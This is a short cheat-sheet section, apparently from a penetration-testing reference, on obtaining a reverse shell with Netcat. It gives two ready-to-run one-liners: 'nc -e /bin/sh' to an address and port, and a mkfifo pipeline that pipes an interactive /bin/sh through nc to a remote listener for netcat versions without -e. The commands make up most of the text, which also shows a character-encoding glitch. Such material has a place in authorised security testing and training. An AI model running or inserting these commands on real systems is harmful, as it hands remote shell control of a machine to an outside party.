### Reverse shell in Netcat

Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which donâ€™t support the -e option.

``nc -e /bin/sh 10.0.0.1 1234``

If you have the wrong version of netcat installed, [Jeff Price points out here](http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498) that you might still be able to get your reverse shell back like this:

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
